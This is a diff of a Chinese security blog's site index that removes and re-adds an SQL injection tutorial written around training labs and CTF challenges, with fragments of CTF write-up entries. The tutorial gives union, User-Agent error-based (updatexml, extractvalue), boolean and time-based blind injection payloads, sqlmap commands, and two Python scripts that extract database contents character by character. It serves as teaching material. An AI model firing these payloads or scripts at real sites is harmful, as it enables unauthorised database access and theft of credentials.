-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username <span class="operator">=</span> $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password <span class="operator">=</span> $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$jc <span class="operator">=</span> $username.$password;</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="string">&#x27;select *from user where username =\&#x27;&#x27;.$username.&#x27;</span>\<span class="string">&#x27; and password=\&#x27;&#x27;.$password.&#x27;</span>\<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">if(preg_match(<span class="string">&#x27;/.*\&#x27;</span>.<span class="operator">*</span><span class="operator">/</span><span class="string">&#x27;,$jc)!== 0)&#123;die(&#x27;</span>为了网站安全性，禁止输入某些特定符号<span class="string">&#x27;);&#125;</span></span><br><span class="line"><span class="string">mysqli_select_db($conn,&#x27;</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="string">&#x27;);//不想告诉你库名</span></span><br><span class="line"><span class="string">$result = mysqli_query($conn,$sql);</span></span><br><span class="line"><span class="string">$row = mysqli_fetch_array($result);</span></span><br><span class="line"><span class="string">$uname = $row[&#x27;</span>username<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$passwd = $row[&#x27;</span>password<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">if($row)&#123;</span></span><br><span class="line"><span class="string">$Insql = &quot;INSERT INTO uagent (`uagent`,`username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;,&#x27;</span>$uname<span class="string">&#x27;)&quot;;</span></span><br><span class="line"><span class="string">$result1 = mysqli_query($conn,$Insql);</span></span><br><span class="line"><span class="string">print_r(mysqli_error($conn));</span></span><br><span class="line"><span class="string">echo &#x27;</span>成功登录<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们查看源码发现有过滤，<code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code>发现服务器会获得我们UA里面的信息，并且<code>    $Insql = &quot;INSERT INTO uagent (</code>uagent<code>,</code>username<code>) VALUES (&#39;$uagent&#39;,&#39;$uname&#39;)&quot;;</code>存放数据库中。</p>
-<p>User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1) or ‘</p>
-<p>或者使用User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1)<code>,1)</code># </p>
-<p>因为传入的是2个参数，我们也需要对后面的参数进行闭合。</p>
-<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-41-35.png" alt="Snipaste_2021-02-05_23-41-35"></p>
-<p>我们看到报错的PATH，下面就是把拼接的语句换成联合查询的语句就ok了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1),1)#                    爆出数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#                                  爆出表名flag_head</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name =&#x27;</span>flag_head<span class="string">&#x27; limit 1,1)),1),1)#      爆出字段名flag_h1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag_h1 <span class="keyword">from</span> flag_head limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#   获得flag</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>该函数是对XML文档进行<code>查询</code>的函数，语法：extractvalue(目标文档路径，xml路径)</p>
-<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))),1)<code>#</code></p>
-<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))) or ‘</p>
-<p>注意闭合。</p>
-<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-51-46.png" alt="Snipaste_2021-02-05_23-41-35"></p>
-<p>我们同样发现报错的PATH，其余和上面同理</p>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>服务器对我们的输入错误并没有很明显的报错回显。</p>
-<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>布尔盲注：  页面只会显示true和false。</p>
-<p>时间盲注 ： 如果页面无论输入什么页面都正常显示，但当我们加入例如 sleep(4),页面延迟4秒，页面即存在时间盲注。</p>
-<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>length() 返回字符串长度</p>
-<p>substr()截取字符串。substr(‘str’,位置,length)  stustr(‘qwer’,1,1)  返回q，stustr(‘qwer’,2,1)返回w。布尔盲注和使用。</p>
-<p>ascii()返回ASCLL值</p>
-<p>if( condition，true _result , false_result ) 例如：if(5=5,1,0)就会返回1，if(6=5,1,0)就会返回0。延时盲注会使用。</p>
-<hr>
-<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>and length(database())=11–+</p>
-<p>and ascii(substr(database(),1,1))=111–+     #利用ascii值的方式进行盲注</p>
-<p>and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=111–+</p>
-<p>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name =’表名’ limit 0,1))=111–+</p>
-<p>and ascii(substr((select  字段 from  表 limit 0,1))=111–+</p>
-<p>这个是通过bp跑的其中一个图，里面长度有时候不好确认，我们可以添加Grep-Match进行匹配页面相关字符串进行筛选，方便我们统计s。</p>
-<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E7%9B%B21.png" alt="盲1"></p>
-<p>不会吧，不会吧，还有人不会写python盲注脚本吧，额好像在说我i</p>
-<p>下面是 学习的脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">        mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">max</span> = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span> = mid+<span class="number">1</span></span><br><span class="line">            mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>当sleep被过滤后，可以考虑用笛卡尔积进行时间盲注：贴的大佬脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;59213b9c-a875-4ea3-994a-ab8b17cc4954.node3.buuoj.cn&#x2F;user&#x2F;login&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    min&#x3D;32</span><br><span class="line">    max&#x3D;128</span><br><span class="line">    while 1:</span><br><span class="line">        j&#x3D;min+(max-min)&#x2F;&#x2F;2</span><br><span class="line">        if j&#x3D;&#x3D;min:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        payload&#x3D;&quot;-1&#39;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;username&#39;:&#39;admin&#39;,</span><br><span class="line">            &#39;password&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.7)</span><br><span class="line">            min&#x3D;j</span><br><span class="line">        except:</span><br><span class="line">            max&#x3D;j</span><br><span class="line">        sleep(0.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
-]]></content>
-      <categories>
-        <category>常见数据库注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VNCTF2021-web</title>
     <url>/2021/03/29/VNCTF2021-web/</url>
     <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
@@ -1081,6 +1026,118 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL注入</title>
+    <url>/2021/01/10/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户拥有可控参数，并且用户传入的参数被当作代码执行。</p>
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="sql注入流程图"></p>
+ <span id="more"></span>
+
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>UNION操作符可用于合并两个或多个SELECT语句的结果集，进行sql语句拼接。</p>
+<p>1.先判断是否存在注入</p>
+<p>2.判断参数类型</p>
+<p>3.使用ORDER BY 查询列数，观察回显的位置</p>
+<p>4.获取数据库名。</p>
+<p>5.获取数据库中的表名。</p>
+<p>6.获取数据库的表中的所有字段名</p>
+<p>7.获取字段中的数据</p>
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p>
+<p>查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>  字段 <span class="keyword">from</span>  表 limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>或者使用group_concat()函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 数据库名.表名</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>都是一样的，不同的是，</p>
+<p>参数传递是POST类型，经常用burp suite进行测试</p>
+<h4 id="手动测试和上面一样"><a href="#手动测试和上面一样" class="headerlink" title="手动测试和上面一样"></a>手动测试和上面一样</h4><p>经常出现在：登录框，搜索框。</p>
+<h4 id="sqlmap测试"><a href="#sqlmap测试" class="headerlink" title="sqlmap测试:"></a>sqlmap测试:</h4><p> 1.sqlmap -r 1.txt，   sqlmap -r 1.txt –dbs等</p>
+<p>2.sqlmap -u <a href="http://www.xxxxx.com/">http://www.xxxxx.com</a> –data “id=1” –dbs</p>
+<p>其中1.txt为我们抓包获得的内容copy to file。</p>
+<p>目的：如果页面有cookie和session,这样我们就不用单独添加这些值的内容了。</p>
+<p>注：如果POST传入多个值，可以通过加<code>*</code>来对<code>*</code>前面的参数进行测试。</p>
+<h2 id="HEADER注入-报错注入"><a href="#HEADER注入-报错注入" class="headerlink" title="HEADER注入+报错注入"></a>HEADER注入+报错注入</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><ul>
+<li>后台为了获取我们的信息，会导致header头（请求头）的部分参数可控，从而产生漏洞。</li>
+</ul>
+<h4 id="发生地方"><a href="#发生地方" class="headerlink" title="发生地方"></a>发生地方</h4><ul>
+<li>http header注入通常发生用户请求头的XFF，User-Agent，referer等地方。主要是应为后台如果获取你的ip，用户信息（User-Agent）等就有可能出现header注入。 </li>
+<li> 黑盒测试会比较困难，白盒测试我们可以通过查看代码查看。</li>
+<li>因为利用insert into 插入页面，基本不会有回显，可以通过<code>盲注</code>或者<code>报错注入</code>进行构造sql语句。</li>
+</ul>
+<h4 id="php超全局变量："><a href="#php超全局变量：" class="headerlink" title="php超全局变量："></a>php超全局变量：</h4><p>$_REQUEST(获取GET/POST)</p>
+<p>$_GET</p>
+<p>$_POST</p>
+<p>$_COOKIE</p>
+<p>$_SERVER(包含请求头的大部分信息，路径，以及脚本位置等等信息的数组)  功能非常强大</p>
+<p>$_SERVER[‘HTTP<code>_</code>HOST’]   可获取请求头里面的host内容</p>
+<p>$_SERVER[“HTTP<code>_</code>USER<code>_</code>AGENT”]  获得UA</p>
+<p>$_SERVER[“REMOTE<code>_</code>ADDR”]     获取用户ip</p>
+<p><a href="https://zhuanlan.zhihu.com/p/147834873">参考文章</a></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p> updatexml() 是用来<code>更新</code>xml的一个函数，语法：updatexml(目标xml内容，xml路径，更新后内容)</p>
+<p>updatexml(1,concat(0x7e,(select database())),1)</p>
+<p>select database()为我们写入的子查询，concat可以将字符串进行拼接，0x7e为<code>~</code>的16进制，数据库支持16进制。</p>
+<p>我们添加了错的xml路径，从而实现报错，将我们的</p>
+<hr>
+<p><a href="http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_code">靶场</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username <span class="operator">=</span> $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password <span class="operator">=</span> $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$jc <span class="operator">=</span> $username.$password;</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="string">&#x27;select *from user where username =\&#x27;&#x27;.$username.&#x27;</span>\<span class="string">&#x27; and password=\&#x27;&#x27;.$password.&#x27;</span>\<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">if(preg_match(<span class="string">&#x27;/.*\&#x27;</span>.<span class="operator">*</span><span class="operator">/</span><span class="string">&#x27;,$jc)!== 0)&#123;die(&#x27;</span>为了网站安全性，禁止输入某些特定符号<span class="string">&#x27;);&#125;</span></span><br><span class="line"><span class="string">mysqli_select_db($conn,&#x27;</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="string">&#x27;);//不想告诉你库名</span></span><br><span class="line"><span class="string">$result = mysqli_query($conn,$sql);</span></span><br><span class="line"><span class="string">$row = mysqli_fetch_array($result);</span></span><br><span class="line"><span class="string">$uname = $row[&#x27;</span>username<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$passwd = $row[&#x27;</span>password<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">if($row)&#123;</span></span><br><span class="line"><span class="string">$Insql = &quot;INSERT INTO uagent (`uagent`,`username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;,&#x27;</span>$uname<span class="string">&#x27;)&quot;;</span></span><br><span class="line"><span class="string">$result1 = mysqli_query($conn,$Insql);</span></span><br><span class="line"><span class="string">print_r(mysqli_error($conn));</span></span><br><span class="line"><span class="string">echo &#x27;</span>成功登录<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们查看源码发现有过滤，<code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code>发现服务器会获得我们UA里面的信息，并且<code>    $Insql = &quot;INSERT INTO uagent (</code>uagent<code>,</code>username<code>) VALUES (&#39;$uagent&#39;,&#39;$uname&#39;)&quot;;</code>存放数据库中。</p>
+<p>User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1) or ‘</p>
+<p>或者使用User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1)<code>,1)</code># </p>
+<p>因为传入的是2个参数，我们也需要对后面的参数进行闭合。</p>
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-41-35.png" alt="Snipaste_2021-02-05_23-41-35"></p>
+<p>我们看到报错的PATH，下面就是把拼接的语句换成联合查询的语句就ok了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1),1)#                    爆出数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#                                  爆出表名flag_head</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name =&#x27;</span>flag_head<span class="string">&#x27; limit 1,1)),1),1)#      爆出字段名flag_h1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag_h1 <span class="keyword">from</span> flag_head limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#   获得flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>该函数是对XML文档进行<code>查询</code>的函数，语法：extractvalue(目标文档路径，xml路径)</p>
+<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))),1)<code>#</code></p>
+<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))) or ‘</p>
+<p>注意闭合。</p>
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-51-46.png" alt="Snipaste_2021-02-05_23-41-35"></p>
+<p>我们同样发现报错的PATH，其余和上面同理</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>服务器对我们的输入错误并没有很明显的报错回显。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>布尔盲注：  页面只会显示true和false。</p>
+<p>时间盲注 ： 如果页面无论输入什么页面都正常显示，但当我们加入例如 sleep(4),页面延迟4秒，页面即存在时间盲注。</p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>length() 返回字符串长度</p>
+<p>substr()截取字符串。substr(‘str’,位置,length)  stustr(‘qwer’,1,1)  返回q，stustr(‘qwer’,2,1)返回w。布尔盲注和使用。</p>
+<p>ascii()返回ASCLL值</p>
+<p>if( condition，true _result , false_result ) 例如：if(5=5,1,0)就会返回1，if(6=5,1,0)就会返回0。延时盲注会使用。</p>
+<hr>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>and length(database())=11–+</p>
+<p>and ascii(substr(database(),1,1))=111–+     #利用ascii值的方式进行盲注</p>
+<p>and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=111–+</p>
+<p>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name =’表名’ limit 0,1))=111–+</p>
+<p>and ascii(substr((select  字段 from  表 limit 0,1))=111–+</p>
+<p>这个是通过bp跑的其中一个图，里面长度有时候不好确认，我们可以添加Grep-Match进行匹配页面相关字符串进行筛选，方便我们统计s。</p>
+<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E7%9B%B21.png" alt="盲1"></p>
+<p>不会吧，不会吧，还有人不会写python盲注脚本吧，额好像在说我i</p>
+<p>下面是 学习的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">        mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">max</span> = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span> = mid+<span class="number">1</span></span><br><span class="line">            mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>当sleep被过滤后，可以考虑用笛卡尔积进行时间盲注：贴的大佬脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;59213b9c-a875-4ea3-994a-ab8b17cc4954.node3.buuoj.cn&#x2F;user&#x2F;login&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    min&#x3D;32</span><br><span class="line">    max&#x3D;128</span><br><span class="line">    while 1:</span><br><span class="line">        j&#x3D;min+(max-min)&#x2F;&#x2F;2</span><br><span class="line">        if j&#x3D;&#x3D;min:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        payload&#x3D;&quot;-1&#39;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;username&#39;:&#39;admin&#39;,</span><br><span class="line">            &#39;password&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.7)</span><br><span class="line">            min&#x3D;j</span><br><span class="line">        except:</span><br><span class="line">            max&#x3D;j</span><br><span class="line">        sleep(0.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
+]]></content>
+      <categories>
+        <category>常见数据库注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mrctf2021</title>
     <url>/2021/04/18/mrctf2021/</url>
     <content><![CDATA[<p>自己太菜了，开始复盘。</p>
@@ -1108,59 +1165,6 @@
       </categories>
       <tags>
         <tag>MRCTF2021</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msf-端口转发-反弹shell</title>
-    <url>/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[<p>这里借助的是免费的端口转发工具，来进行演示。</p>
-<p><a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p>
